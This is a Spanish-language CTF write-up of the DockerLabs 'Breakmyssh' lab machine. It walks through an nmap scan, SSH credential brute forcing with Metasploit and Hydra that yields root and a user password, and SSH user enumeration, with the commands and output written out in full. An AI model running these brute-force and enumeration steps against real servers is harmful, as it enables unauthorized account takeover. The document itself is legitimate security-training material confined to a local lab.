---
title: CTF-DockerLabs-Breakmyssh
published: true
---

## WriteUps maquina Breakmyssh de DockerLabs

---
tags:
  - CTF
  - estado/completado
  - plataforma: [DockerLabs]
  - dificultad: Muy fácil
  - autor: [Romabri]

# Datos

[!INFO] Breakmyssh
>  **Nombre:** Breakmyssh
>  **SO:** Linux
>  **Dificultad:** Muy fácil
>  **Enlace:** [Dockerlabs](https://dockerlabs.es/)

[!TODO] Objetivo
> 🚩Ingresar a la maquina como algún usuario.
> 🚩Elevar privilegios una vez obtenido el acceso.

El primer paso consiste en iniciar la máquina, lo cual es tan sencillo como ejecutar el siguiente comando después de haber descargado la maquina:

```bash
└─$ sudo bash auto_deploy.sh breakmyssh.tar
```

# Reconocimiento

> Una vez iniciada la maquina, el mismo script de inicio me da la dirección IP a lo cual procedo a realizar un escaneo de puertos de la maquina y el resultado es el siguiente:

```bash
└─# nmap 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-22 17:20 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000017s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
```

Esta maquina se pone un poco más interesante pues solo tenemos el puerto `SSH` abierto y no tenemos usuario, podría intentar enumerar usuarios, pero intentare primero usar metasploit. 

# Fuerza bruta con metasploit

> Ya que no tengo usuarios, procedo a descargar el siguiente diccionario de usuarios [GitHub - hackingyseguridad/diccionarios](https://github.com/hackingyseguridad/diccionarios) y adicional le pasare `rockyou.txt` para la contraseña.

Utilizo `ssh_login` con metasploit de la siguiente manera:

```bash
msf6 > use auxiliary/scanner/ssh/ssh_login
```

Para el diccionario de usuario, utilizo el descargado desde github.

```bash
SET USER_FILE /usr/share/wordlists/users.txt
```

Para la contraseña utilizo `rockyou.txt`

```bash
SET PASS_FILE /usr/share/wordlists/users.txt
```

Defino la IP de mi objetivo:

```bash
SET RHOSTS 172.17.0.2
```

Y luego hago un `run` o `exploit` para ejecutarlo y al cabo de un rato me encuentra las credenciales de root.

```bash
msf6 auxiliary(scanner/ssh/ssh_login) > exploit

[*] 172.17.0.2:22 - Starting bruteforce
[+] 172.17.0.2:22 - Success: 'root:xxxxxxxx' 'uid=0(root) gid=0(root) groups=0(root) Linux 4d678d7eed61 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.15-2kali1 (2024-05-17) x86_64 GNU/Linux '
[*] SSH session 1 opened (172.17.0.1:43721 -> 172.17.0.2:22) at 2024-05-22 21:51:25 -0400
```

Y bueno ya con esto se puede decir que la maquina esta completa, sin embargo estando como root, chequeo para ver si existe algún usuario en el sistema, así que voy a directorio `/home` y resulta que existe el usuario: `lovely`

![pwnedBreakmyssh.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/pwnedBreakmyssh.png)

# Fuerza bruta SSH

> Ahora que se que existe el usuario `lovely` en el sistema, procedo a realizar un ataque de fuerza bruta usando `hydra` como en las otras maquinas, de la siguiente manera:

```bash
└─# hydra -l lovely -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: lovely   password: rockyou
```

Y rápidamente me encuentra la contraseña del usuario, a lo que me conecto por SSH, sin embargo queda mi duda, ¿Cómo podría haber encontrado el usuario?

# Enumerando usuarios

Creo que al principio lo que tenia que haber utilizado era: `auxiliary/scanner/ssh/ssh_enumusers` y definir los siguientes parametros:

```bash
SET RHOSTS 172.17.0.2
SET USER_FILE /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```

Y el resultado fue el siguiente:

```bash
msf6 auxiliary(scanner/ssh/ssh_enumusers) > exploit

[*] 172.17.0.2:22 - SSH - Using malformed packet technique
[*] 172.17.0.2:22 - SSH - Checking for false positives
[*] 172.17.0.2:22 - SSH - Starting scan
[+] 172.17.0.2:22 - SSH - User 'mail' found
[+] 172.17.0.2:22 - SSH - User 'root' found
[+] 172.17.0.2:22 - SSH - User 'news' found
[+] 172.17.0.2:22 - SSH - User 'man' found
[+] 172.17.0.2:22 - SSH - User 'bin' found
[+] 172.17.0.2:22 - SSH - User 'games' found
[+] 172.17.0.2:22 - SSH - User 'nobody' found
[+] 172.17.0.2:22 - SSH - User 'lovely' found
[+] 172.17.0.2:22 - SSH - User 'backup' found
[+] 172.17.0.2:22 - SSH - User 'daemon' found
[+] 172.17.0.2:22 - SSH - User 'proxy' found
[+] 172.17.0.2:22 - SSH - User 'list' found
[*] Auxiliary module execution completed
```

Y el resultado confirma mi sospecha, lo primero era enumerar usuarios, el resultado luego de mostrarme algunos usuarios del sistema, también me muestra `lovely` entonces el procedimiento ideal seria, enumerar los usuarios, y luego lanzar un hydra o en todo caso un metasploit y listo, objetivo conseguido.

# Comandos

[!IMPORTANT] Resumen de comandos utilizados
> `sudo bash auto_deploy.sh vacaciones.tar`
> `nmap 172.17.0.2`
> `msfconsole`
> `use auxiliary/scanner/ssh/ssh_login`
> `SET USER_FILE /usr/share/wordlists/users.txt`
> `SET PASS_FILE /usr/share/wordlists/users.txt`
> `SET RHOSTS 172.17.0.2`
> `hydra -l lovely -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh`
> `use auxiliary/scanner/ssh/ssh_enumusers`
> `SET USER_FILE /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt`



```
¡Que la fuerza del hacking ético nos acompañe! :)
```

|   |
|:--|
|   |